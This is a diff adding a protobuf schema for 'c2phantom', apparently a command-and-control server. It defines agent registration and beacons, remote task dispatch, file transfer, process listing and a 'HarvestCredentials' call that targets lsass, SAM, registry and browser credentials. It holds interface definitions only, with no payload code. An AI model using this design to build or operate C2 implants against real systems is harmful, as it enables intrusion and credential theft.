@@ -1,0 +1,138 @@
+syntax = "proto3";
+
+package c2phantom;
+
+// Go option for package
+option go_package = "github.com/4fqr/c2-phantom/server/proto";
+
+// Agent registration
+message AgentRegisterRequest {
+    string agent_id = 1;
+    string hostname = 2;
+    string username = 3;
+    string os_info = 4;
+    string ip_address = 5;
+    int32 pid = 6;
+    map<string, string> metadata = 7;
+}
+
+message AgentRegisterResponse {
+    bool success = 1;
+    string message = 2;
+    string session_id = 3;
+}
+
+// Task/Command messages
+message Task {
+    string task_id = 1;
+    string agent_id = 2;
+    string command = 3;
+    repeated string args = 4;
+    map<string, string> options = 5;
+    int64 timestamp = 6;
+}
+
+message TaskResult {
+    string task_id = 1;
+    string agent_id = 2;
+    bool success = 3;
+    bytes output = 4;
+    string error = 5;
+    int64 timestamp = 6;
+}
+
+// Agent beacon/heartbeat
+message BeaconRequest {
+    string agent_id = 1;
+    string session_id = 2;
+    int64 timestamp = 3;
+    AgentStatus status = 4;
+}
+
+message BeaconResponse {
+    repeated Task pending_tasks = 1;
+    int32 beacon_interval = 2;  // seconds
+    bool terminate = 3;
+}
+
+message AgentStatus {
+    double cpu_usage = 1;
+    uint64 memory_usage = 2;
+    string current_dir = 3;
+    bool has_admin = 4;
+}
+
+// File operations
+message FileUploadRequest {
+    string agent_id = 1;
+    string remote_path = 2;
+    bytes chunk_data = 3;
+    int32 chunk_index = 4;
+    int32 total_chunks = 5;
+}
+
+message FileDownloadRequest {
+    string agent_id = 1;
+    string remote_path = 2;
+}
+
+message FileDownloadResponse {
+    bytes chunk_data = 1;
+    int32 chunk_index = 2;
+    int32 total_chunks = 3;
+    bool complete = 4;
+}
+
+// Process operations
+message ProcessListRequest {
+    string agent_id = 1;
+}
+
+message ProcessInfo {
+    int32 pid = 1;
+    string name = 2;
+    string path = 3;
+    string owner = 4;
+    uint64 memory = 5;
+}
+
+message ProcessListResponse {
+    repeated ProcessInfo processes = 1;
+}
+
+// Credential harvesting
+message CredentialRequest {
+    string agent_id = 1;
+    string cred_type = 2;  // "lsass", "sam", "registry", "browser"
+}
+
+message Credential {
+    string username = 1;
+    string password = 2;
+    string domain = 3;
+    string source = 4;
+    map<string, string> extra = 5;
+}
+
+message CredentialResponse {
+    repeated Credential credentials = 1;
+}
+
+// C2 Server service
+service C2Server {
+    // Agent lifecycle
+    rpc RegisterAgent(AgentRegisterRequest) returns (AgentRegisterResponse);
+    rpc Beacon(BeaconRequest) returns (BeaconResponse);
+    
+    // Task management
+    rpc SendTask(Task) returns (stream TaskResult);
+    rpc GetTaskResults(Task) returns (TaskResult);
+    
+    // File operations
+    rpc UploadFile(stream FileUploadRequest) returns (TaskResult);
+    rpc DownloadFile(FileDownloadRequest) returns (stream FileDownloadResponse);
+    
+    // Information gathering
+    rpc ListProcesses(ProcessListRequest) returns (ProcessListResponse);
+    rpc HarvestCredentials(CredentialRequest) returns (CredentialResponse);
+}
